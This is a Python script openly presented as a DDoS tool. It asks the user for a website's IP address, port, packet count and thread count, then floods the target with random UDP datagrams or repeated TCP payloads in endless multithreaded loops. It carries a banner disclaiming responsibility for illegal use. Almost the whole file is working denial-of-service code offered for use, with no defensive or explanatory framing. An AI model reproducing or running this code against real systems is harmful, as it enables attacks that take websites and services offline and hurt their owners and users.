
#!/usr/bin/env python3
#Ddos Tool by CazzySoci
import random
import socket
import threading
import os

os.system("clear")
#Cazzy
(credit) = """
\033[1;31;40m
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
Simple But Terrible
Created By: CazzySoci
Warning! We are not responsible for your Illegal Activities!
[Please Use This Tool Wisely!]
\n"""
print(credit)
fake_ip = '149.154.68.204'
ip = str(input(" |Website| Ip: "))
port = int(input(" |Website| Port: "))
choice = str(input(" |Boost| Do you want to Power up?(y/n):"))
times = int(input(" |Amount| Packets: "))
threads = int(input(" |Amount| Threads: "))
def run():
 data = random._urandom(4096)
 i = random.choice(("[c]","[a]","[z]"))
 while True:
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   addr = (str(ip),int(port))
   for x in range(times):
    s.sendto(data,addr)
   print(i +" | Cazzy Attacking |")
  except:
   print("[c] | Server down!!! |")
#Cazzy
def run2():
 data = random._urandom(4096)
 i = random.choice(("[c]","[a]","[z]"))
 while True:
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip,port))
   s.send(data)
   for x in range(times):
    s.send(data)
   print(i +" CAZZY!!!")
  except:
   s.close()
   print("[c] I already told you It's Down")
#Cazzy
def run2():
 data = random._urandom(4096)
 i = random.choice(("[c]","[a]","[z]"))
 while True:
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip,port))
   s.send(data)
   for x in range(times):
    s.send(data)
   print(i +" Cazzy The Best!!!")
  except:
   s.close()
   print("[c] I already told you It's Down")
#Cazzy
for y in range(threads):
 if choice == 'y':
  th = threading.Thread(target = run)
  th.start()
 else:
  th = threading.Thread(target = run2)
  th.start()
#Created By Cazzy
